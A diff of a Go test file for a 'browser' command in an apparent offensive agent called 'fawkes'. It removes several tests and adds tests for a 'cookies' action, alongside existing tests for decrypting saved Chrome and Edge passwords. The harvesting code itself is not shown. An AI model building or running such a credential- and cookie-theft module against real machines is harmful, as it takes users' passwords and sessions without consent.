@@ -6,25 +6,10 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
-	"encoding/json"
 	"testing"
 
 	"fawkes/pkg/structs"
 )
-
-func TestBrowserCommand_Name(t *testing.T) {
-	cmd := &BrowserCommand{}
-	if cmd.Name() != "browser" {
-		t.Errorf("expected 'browser', got %q", cmd.Name())
-	}
-}
-
-func TestBrowserCommand_Description(t *testing.T) {
-	cmd := &BrowserCommand{}
-	if cmd.Description() == "" {
-		t.Error("expected non-empty description")
-	}
-}
 
 func TestBrowserCommand_EmptyParams(t *testing.T) {
 	cmd := &BrowserCommand{}
@@ -44,14 +29,6 @@ func TestBrowserCommand_InvalidJSON(t *testing.T) {
 	}
 }
 
-func TestBrowserCommand_UnknownAction(t *testing.T) {
-	cmd := &BrowserCommand{}
-	result := cmd.Execute(structs.Task{Params: `{"action":"invalid"}`})
-	if result.Status != "error" {
-		t.Errorf("expected error for unknown action, got %q", result.Status)
-	}
-}
-
 func TestBrowserCommand_ChromeOnly(t *testing.T) {
 	cmd := &BrowserCommand{}
 	result := cmd.Execute(structs.Task{Params: `{"browser":"chrome"}`})
@@ -65,45 +42,6 @@ func TestBrowserCommand_EdgeOnly(t *testing.T) {
 	result := cmd.Execute(structs.Task{Params: `{"browser":"edge"}`})
 	if result.Status != "success" {
 		t.Errorf("expected success, got %q: %s", result.Status, result.Output)
-	}
-}
-
-func TestBrowserPaths_All(t *testing.T) {
-	paths := browserPaths("all")
-	if paths == nil {
-		t.Skip("LOCALAPPDATA not set")
-	}
-	if _, ok := paths["Chrome"]; !ok {
-		t.Error("expected Chrome path")
-	}
-	if _, ok := paths["Edge"]; !ok {
-		t.Error("expected Edge path")
-	}
-}
-
-func TestBrowserPaths_Chrome(t *testing.T) {
-	paths := browserPaths("chrome")
-	if paths == nil {
-		t.Skip("LOCALAPPDATA not set")
-	}
-	if len(paths) != 1 {
-		t.Errorf("expected 1 path for chrome, got %d", len(paths))
-	}
-	if _, ok := paths["Chrome"]; !ok {
-		t.Error("expected Chrome path only")
-	}
-}
-
-func TestBrowserPaths_Edge(t *testing.T) {
-	paths := browserPaths("edge")
-	if paths == nil {
-		t.Skip("LOCALAPPDATA not set")
-	}
-	if len(paths) != 1 {
-		t.Errorf("expected 1 path for edge, got %d", len(paths))
-	}
-	if _, ok := paths["Edge"]; !ok {
-		t.Error("expected Edge path only")
 	}
 }
 
@@ -201,25 +139,19 @@ func TestDecryptPassword_WrongKey(t *testing.T) {
 	}
 }
 
-func TestBrowserArgs_Defaults(t *testing.T) {
-	var args browserArgs
-	json.Unmarshal([]byte(`{}`), &args)
-	if args.Action != "" {
-		t.Errorf("expected empty action, got %q", args.Action)
+func TestBrowserCommand_CookiesAction(t *testing.T) {
+	cmd := &BrowserCommand{}
+	result := cmd.Execute(structs.Task{Params: `{"action":"cookies"}`})
+	// Should succeed even with no browsers installed
+	if result.Status != "success" {
+		t.Errorf("expected success for cookies action, got %q: %s", result.Status, result.Output)
 	}
-	// The Execute function fills in defaults
 }
 
-func TestBrowserArgs_Full(t *testing.T) {
-	var args browserArgs
-	err := json.Unmarshal([]byte(`{"action":"passwords","browser":"chrome"}`), &args)
-	if err != nil {
-		t.Fatal(err)
-	}
-	if args.Action != "passwords" {
-		t.Errorf("expected 'passwords', got %q", args.Action)
-	}
-	if args.Browser != "chrome" {
-		t.Errorf("expected 'chrome', got %q", args.Browser)
+func TestBrowserCommand_CookiesChromeOnly(t *testing.T) {
+	cmd := &BrowserCommand{}
+	result := cmd.Execute(structs.Task{Params: `{"action":"cookies","browser":"chrome"}`})
+	if result.Status != "success" {
+		t.Errorf("expected success, got %q: %s", result.Status, result.Output)
 	}
 }
